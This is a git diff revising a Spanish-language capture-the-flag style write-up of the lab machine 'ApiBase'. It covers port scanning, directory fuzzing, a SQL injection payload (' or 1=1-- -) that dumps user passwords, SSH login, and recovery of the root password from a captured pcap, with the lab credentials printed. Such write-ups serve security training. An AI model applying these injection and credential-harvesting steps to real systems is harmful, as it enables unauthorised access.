@@ -1,7 +1,6 @@
-# 🧠 **Informe de Pentesting – Máquina: ApiBase** 
+# 🧠 **Informe de Pentesting – Máquina: ApiBase**
 
 ### 💡 **Dificultad:** Fácil
-
 
 ![Despliegue](Imágenes/2025-05-19_22-36.png)
 
@@ -9,18 +8,19 @@
 
 ## 📝 **Descripción de la máquina**
 
+*Pendiente de completar.*
 
 ---
 
 ## 🎯 **Objetivo**
 
-
+*Obtener acceso inicial a la máquina a través de la API expuesta, escalar privilegios hasta obtener acceso como root, y documentar detalladamente cada paso del proceso.*
 
 ---
 
 ## ⚙️ **Despliegue de la máquina**
 
-Se descarga el archivo comprimido de la máquina vulnerable y se lanza el contenedor Docker mediante el script incluido:
+Se descarga el archivo comprimido de la máquina y se lanza el contenedor Docker utilizando el script proporcionado:
 
 ```bash
 unzip apibase.zip
@@ -33,7 +33,7 @@ sudo bash auto_deploy.sh apibase.tar
 
 ## 📡 **Comprobación de conectividad**
 
-Verificamos que la máquina se encuentra activa respondiendo a peticiones ICMP (ping):
+Se verifica que la máquina objetivo está activa y responde a peticiones ICMP:
 
 ```bash
 ping -c1 172.17.0.3
@@ -45,20 +45,20 @@ ping -c1 172.17.0.3
 
 ## 🔍 **Escaneo de Puertos**
 
-Realizamos un escaneo completo para detectar todos los puertos abiertos:
+Realizamos un escaneo de todos los puertos para detectar cuáles están abiertos:
 
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt
 ```
 
-**Puertos detectados:**
+**Puertos descubiertos:**
 
 * `22/tcp`: SSH
 * `5000/tcp`: HTTP
 
 ![Puertos](Imágenes/Capturas_2.png)
 
-Luego, analizamos los servicios y versiones asociados a esos puertos:
+A continuación, analizamos los servicios y versiones presentes en los puertos detectados:
 
 ```bash
 nmap -sCV -p22,80 172.17.0.3 -oN target.txt
@@ -66,74 +66,194 @@ nmap -sCV -p22,80 172.17.0.3 -oN target.txt
 
 ![Servicios](Imágenes/Capturas_3.png)
 
-Nos vamos a ver la API en http://172.17.0.3:5000 donde poemos ver que hice una solicitud para añadir usuarios (probablemente un GET o POST) a la raíz del servidor (/), pero el backend no tiene lógica implementada para manejar esa ruta directamente.
+---
+
+## 🌐 **Exploración de la Aplicación Web**
+
+Accedemos a la dirección [http://172.17.0.3:5000](http://172.17.0.3:5000) donde se muestra una API que permite añadir usuarios, aunque al probar la funcionalidad directamente desde el navegador no obtenemos respuesta funcional.
+
 ![Pagina API](Imágenes/Capturas_4.png)
 
----
-directorio /users que se descubre en la pagina
-![Pagina API](Imágenes/Capturas_10.png)
+Descubrimos el endpoint `/users`, el cual se menciona en la misma interfaz.
 
-Realizamos fuzzing gobuster dir -u http://172.17.0.3:5000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x .php,.html,.txt y encontramos los directorios:
+![Directorio /users](Imágenes/Capturas_10.png)
+
+---
+
+## 📁 **Fuzzing de Directorios**
+
+Utilizamos `gobuster` para descubrir rutas ocultas en el servidor:
+
+```bash
+gobuster dir -u http://172.17.0.3:5000 \
+-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+-t 20 -add-slash -b 403,404 -x .php,.html,.txt
+```
+
 ![Fuzzing](Imágenes/Capturas_5.png)
 
-http://172.17.0.3:5000/add
-![add](Imágenes/Capturas_6.png)
-Nota: El error "405 Method Not Allowed" significa que estás haciendo una solicitud con un método HTTP (como GET o POST) que no está permitido para la ruta a la que estás accediendo (No se puede hacer por la pagina web) tambien la habiamos visto en la pagina api.
+Encontramos las rutas `/add` y `/console`, entre otras.
 
-http://172.17.0.3:5000/console
-![console](Imágenes/Capturas_7.png)
+* **Ruta `/add`**: Intenta aceptar datos vía POST, pero no permite método GET.
 
-En la página principal se indica que es posible añadir un usuario, pero desde la interfaz web no parece funcionar. Por ello, realizaremos un envío mediante una petición POST, siguiendo la estructura requerida para que el servidor la acepte correctamente.
+  ![add](Imágenes/Capturas_6.png)
 
-curl -X POST "http://172.17.0.3:5000/add" -H "Content-Type: application/x-www-form-urlencoded" --data "username=Alejandro&email=AlejandroSL@gmail.com.com&password=277353277353"
-Nota: sabemos que tuvimos azito porque vemos el mensaje: 
+  El error **"405 Method Not Allowed"** indica que la ruta no acepta el método HTTP utilizado.
+
+* **Ruta `/console`**: Ruta expuesta, posiblemente para depuración.
+
+  ![console](Imágenes/Capturas_7.png)
+
+---
+
+## 📨 **Prueba de envío de datos por POST**
+
+La ruta `/add` permite agregar usuarios mediante una petición `POST`. Ejecutamos el siguiente comando:
+
+```bash
+curl -X POST "http://172.17.0.3:5000/add" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+--data "username=Alejandro&email=AlejandroSL@gmail.com&password=277353277353"
+```
+
+Recibimos confirmación de éxito:
+
+```json
 {
   "message": "User added"
 }
+```
+
 ![POST](Imágenes/Capturas_8.png)
 
-usamos curl -X GET "http://172.17.0.3:5000/users?username=Alejandro" para ver el usuario añadido sabemos que existe el metodo users por la api mostrada en la pagina
+---
+
+## 🔍 **Consulta de usuarios añadidos**
+
+Consultamos el usuario que acabamos de añadir usando:
+
+```bash
+curl -X GET "http://172.17.0.3:5000/users?username=Alejandro"
+```
+
 ![GET](Imágenes/Capturas_9.png)
 
 ---
 
-![useraname](Imágenes/Capturas_11.png)
+## 🛠️ **Análisis con Burp Suite**
 
-Con toda esta informacion nos vamos a burpsuite:  burpsuite &> /dev/null & disown y interceotamos la peticion de: http://172.17.0.3:5000/users?username=Alejandro activamos nuestro proxi, en bursuite no vamos a proxi inteseptamos la peticion (recargar la pagina) y en bursuite clic derecho a la peticon y send to repeter y nos movemos a la pestaña repeter donde estara interceptado la peticion
-![Bursuite](Imágenes/Capturas_12.png)
+Abrimos Burp Suite:
 
-Al dar clic en sen mandamos la peticion y nos devuelve el get de nuestro usuario funciona correctamente
-![Bursuite](Imágenes/Capturas_13.png)
+```bash
+burpsuite &> /dev/null & disown
+```
 
-Se prueba en mandar ina inyeccion cambiando Alejandro por ' y nos da un HTTP/1.0 500 INTERNAL SERVER ERROR esto nos muestra que si es vulnerable a inyecciones
+Interceptamos la petición hacia `/users?username=Alejandro`, la enviamos al **Repeater**, y analizamos su respuesta.
+
+![Burpsuite intercept](Imágenes/Capturas_12.png)
+![Burpsuite repeater](Imágenes/Capturas_13.png)
+
+---
+
+## 💥 **Detección de Inyección SQL**
+
+Modificamos el parámetro `username` introduciendo un `'`, lo que genera un error interno del servidor:
+
+```http
+HTTP/1.0 500 INTERNAL SERVER ERROR
+```
+
 ![Inyeccion](Imágenes/Capturas_14.png)
 
-Se llevó a cabo una inyección SQL en el parámetro `username` mediante la cadena `'or 1=1-- -`. Esta técnica permitió evadir los filtros de autenticación y ejecutar una consulta maliciosa, obteniendo como respuesta una lista completa de usuarios y contraseñas almacenados en la base de datos del servidor.
+Esto indica una **vulnerabilidad a inyecciones SQL**.
 
-Usuario: pingu
-Contraseña: your_password
+Probamos la siguiente inyección:
 
-Usario:pingu 
-Contraseñapinguinasio
-![Inteccion](Imágenes/Capturas_15.png)
+```bash
+/users?username=' or 1=1-- -
+```
 
-Entramos al servicio de SSH con las credenciales Usuario: pingu Contraseña: Contraseñapinguinasio donde buscando alguna escala no encotre nada vulnerable pero encontre un archivo que guarda trafico de red network.pcap, podemos descargar el archivo con  wget http://172.17.0.3:1024/network.pcap en nuestro host atacante o entrando a la url: http://172.17.0.3:1024/
-![Inteccion](Imágenes/Capturas_19.png)
+Esto nos devuelve la lista de usuarios y contraseñas de la base de datos.
 
+* Usuario: `pingu`
+* Contraseña: `pinguinasio`
 
----
-
-![SHH](Imágenes/Capturas_16.png)
+![Inyeccion exitosa](Imágenes/Capturas_15.png)
 
 ---
 
-![servidor](Imágenes/Capturas_17.png)
+## 🔐 **Acceso por SSH**
 
-Usamos wireshark para ver el contenido
-![wire](Imágenes/Capturas_18.png)
+Nos conectamos mediante SSH con las credenciales extraídas:
 
-Al revisar los paqutes se encotro la contraseña de root balulero
-![root](Imágenes/Capturas_20.png)
-Entramos a root con su root balulero
+```bash
+ssh pingu@172.17.0.3
+# Contraseña: pinguinasio
+```
+
+![SSH](Imágenes/Capturas_16.png)
+
+---
+
+## 📁 **Revisión del sistema**
+
+Buscando posibles vectores de escalada, encontramos un archivo sospechoso:
+
+* `network.pcap`
+
+El archivo contiene tráfico de red y está expuesto en el puerto `1024`. Lo descargamos con:
+
+```bash
+wget http://172.17.0.3:1024/network.pcap
+```
+
+O lo visualizamos directamente desde el navegador:
+
+![Servidor HTTP](Imágenes/Capturas_17.png)
+
+---
+
+## 🔍 **Análisis del tráfico con Wireshark**
+
+Abrimos el archivo `.pcap` con Wireshark:
+
+```bash
+wireshark network.pcap
+```
+
+![Wireshark](Imágenes/Capturas_18.png)
+
+Revisando el contenido, encontramos la **contraseña del usuario root**:
+**Contraseña: `balulero`**
+
+![Contraseña root](Imágenes/Capturas_20.png)
+
+---
+
+## 🧑‍💻 **Acceso como root**
+
+Nos conectamos al sistema como `root` utilizando las credenciales extraídas:
+
+```bash
+su root
+# Contraseña: balulero
+```
+
+¡Acceso completo!
+
 ![SSHroot](Imágenes/Capturas_21.png)
 
+---
+
+## ✅ **Resumen del Proceso**
+
+1. 🚀 **Despliegue y detección de servicios** (SSH y HTTP).
+2. 🕵️ **Enumeración de rutas y endpoints expuestos**.
+3. 📬 **Envío de datos mediante POST a la API**.
+4. 🔍 **Análisis con BurpSuite e identificación de vulnerabilidad SQLi**.
+5. 🛡️ **Obtención de credenciales válidas**.
+6. 🔑 **Acceso vía SSH como usuario regular**.
+7. 🧠 **Análisis de tráfico para extracción de credenciales root**.
+8. 🧑‍💻 **Acceso como root con control total del sistema**.
+
+---
